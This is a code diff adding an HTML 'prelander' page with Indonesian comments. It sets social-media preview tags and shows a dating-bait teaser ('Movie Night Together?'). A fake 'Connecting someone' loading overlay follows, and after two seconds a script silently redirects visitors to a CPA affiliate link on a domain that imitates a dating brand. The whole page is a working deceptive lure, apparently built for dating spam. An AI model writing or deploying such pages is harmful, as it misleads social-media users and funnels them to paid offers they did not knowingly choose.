@@ -1,0 +1,96 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎥 NOW PLAYING: Movie Night Together?</title>
+
+  <!-- FB PREVIEW PAKE FOTO1 -->
+  <meta property="og:title" content="🎥 NOW PLAYING: Movie Night Together?">
+  <meta property="og:description" content="👀 Let's See if We Vibe">
+  <meta property="og:image" content="https://cdn.phototourl.com/member/2026-10-17-7844b864-8a66-43d3-8dea-da9ffd4e09ea.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="675">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+    body { background: #000; display: flex; justify-content: center; }
+    .card { width: 100%; max-width: 500px; background: #111; border-radius: 0 0 16px 16px; overflow: hidden; }
+    .foto { width: 100%; }
+    .foto img { width: 100%; display: block; }
+    .content { padding: 16px; color: #fff; }
+    .judul { font-size: 18px; font-weight: bold; margin-bottom: 6px; }
+    .deskripsi { font-size: 14px; color: #bbb; }
+
+    /* Loading ONO BACKGROUND FOTO2 + GRADIENT PINK UNGU */
+    .loading {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: url('https://cdn.phototourl.com/member/2026-10-17-7844b864-8a66-43d3-8dea-da9ffd4e09ea.jpg') center/cover no-repeat;
+      display: flex; justify-content: center; align-items: center;
+      z-index: 9999;
+    }
+    .loading::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: linear-gradient(-45deg, rgba(255,20,147,0.75), rgba(157,0,255,0.75), rgba(255,105,180,0.75), rgba(138,43,226,0.75));
+      background-size: 400% 400%;
+      animation: gradient 1.5s ease infinite;
+    }
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .loading-text {
+      position: relative;
+      color: #fff; font-size: 20px; font-weight: bold;
+      text-shadow: 0 0 15px #9d00ff, 0 0 25px #ff1493;
+      animation: kedip 0.8s ease-in-out infinite;
+      text-align: center;
+      z-index: 2;
+    }
+    @keyframes kedip {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.6; transform: scale(1.05); }
+    }
+    .dots::after { content: ''; animation: dots 1s steps(3, end) infinite; }
+    @keyframes dots {
+      0% { content: '.'; } 33% { content: '..'; } 66% { content: '...'; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- PRELANDER PAKE FOTO1 -->
+  <div class="card">
+    <div class="foto">
+      <img src="https://cdn.phototourl.com/member/2026-10-17-7844b864-8a66-43d3-8dea-da9ffd4e09ea.jpg" alt="Foto">
+    </div>
+    <div class="content">
+      <div class="judul">🎥 NOW PLAYING: Movie Night Together?</div>
+      <div class="deskripsi">👀 Let's See if We Vibe</div>
+    </div>
+  </div>
+
+  <!-- LOADING PAKE FOTO2 + GRADIENT 2 DETIK -->
+  <div class="loading" id="loading">
+    <div class="loading-text">Connecting someone people<span class="dots"></span></div>
+  </div>
+
+  <script>
+    const LINK_CPA = "https://bumbleby.mom/crUdDpqJ";
+
+    // 2 detik langsung redirect
+    setTimeout(() => {
+      window.location.replace(LINK_CPA);
+    }, 2000);
+  </script>
+
+</body>
+</html>
